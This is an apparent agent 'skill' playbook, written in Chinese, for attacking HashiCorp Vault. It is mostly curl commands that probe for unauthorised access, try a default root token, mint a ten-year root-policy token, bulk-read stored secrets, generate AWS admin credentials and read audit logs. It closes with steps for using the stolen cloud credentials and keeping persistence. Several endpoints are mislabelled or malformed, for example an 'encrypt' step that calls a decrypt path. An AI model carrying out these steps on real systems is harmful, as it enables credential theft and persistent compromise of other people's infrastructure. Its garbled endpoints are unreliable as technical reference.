---
name: vault-attack
type: attack
category: secrets-manager
platform: vault
severity: critical
---

# Vault 攻击技能

## 触发条件

- 发现 Vault 实例
- 有 Vault Token
- 用户要求"攻击 Vault"

## 前置检查

```bash
# 1. 测试连接
curl http://vault.example.com:8200/v1/sys/health

# 2. 检查版本
curl http://vault.example.com:8200/v1/sys/Seal
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试访问
curl http://vault.example.com:8200/v1/sys/metrics

# 2. 列出密钥
curl http://vault.example.com:8200/v1/secret/list
```

### 方法 2. Token 窃取

```bash
# 1. 尝试默认 token
export VAULT_TOKEN="root_token"
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/auth/token/lookup/self

# 2. 创建新 token
curl -X POST \
  -H "X-Vault-Token: $VAULT_TOKEN" \
  -d '{"policies":["root"],"ttl":"87600h"}' \
  http://vault.example.com:8200/v1/auth/token/create
```

### 方法 3. Secrets 窃取

```bash
# 1. 列出所有 secrets
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/secret/list

# 2. 读取 secret
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/secret/data/password

# 3. 批量读取
for secret in $(curl -s -H "X-Vault-Token: $VAULT_TOKEN" http://vault.example.com:8200/v1/secret/list | jq -r '.[]'); do
    echo "=== $secret ==="
    curl -H "X-Vault-Token: $VAULT_TOKEN" \
      http://vault.example.com:8200/v1/secret/data/$secret
done
```

### 方法 4. 动态凭证窃取

```bash
# 1. 列出动态凭证
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/aws/creds/list

# 2. 生成凭证
curl -X POST \
  -H "X-Vault-Token: $VAULT_TOKEN" \
  -d '{"role":"admin","ttl":"1h"}' \
  http://vault.example.com:8200/v1/aws/creds/creds/admin

# 3. 获取凭证
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/aws/creds/creds/admin
```

### 方法 5. Audit Log 窃取

```bash
# 1. 读取审计日志
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/audit/hash

# 2. 分析日志中的凭证
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  "http://vault.example.com:8200/v1/audit/log/file?list=true"
```

### 方法 6. Transit 加密密钥

```bash
# 1. 加密数据（如果配置了 transit backend）
curl -X POST \
  -H "X-Vault-Token: $VAULT_TOKEN" \
  -d '{"plaintext":"SENSITIVE_DATA","key_name":"transit-key"}' \
  http://vault.example.com:8200/v1/transit/decrypt
```

## 验证成功

```bash
# 成功读取 secret
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/secret/data/password

# 成功创建 token
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/auth/token/lookup/self

# 成功生成凭证
curl -H "X-Vault-Token: $VAULT_TOKEN" \
  http://vault.example.com:8200/v1/aws/creds/creds/admin
```

## 下一步

1. 使用窃取的凭证访问 AWS/Azure/GCP
2. 通过 Vault 持久化
3. 攻击其他密钥管理系统
